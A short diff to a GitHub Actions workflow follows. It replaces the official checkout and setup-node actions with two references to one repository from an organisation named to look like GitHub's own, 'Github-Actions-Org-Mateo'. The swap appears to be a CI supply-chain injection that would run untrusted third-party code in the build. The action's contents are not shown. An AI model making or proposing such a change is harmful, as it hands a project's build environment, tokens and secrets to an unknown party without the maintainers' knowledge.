@@ -7,9 +7,9 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v2
+      - uses: Github-Actions-Org-Mateo/Github-Actions-2@v2
       - name: Use NodeJS
-        uses: actions/setup-node@v1
+        uses: Github-Actions-Org-Mateo/Github-Actions-2@v1
         with:
           node-version: "12.x"
       - run: npm ci
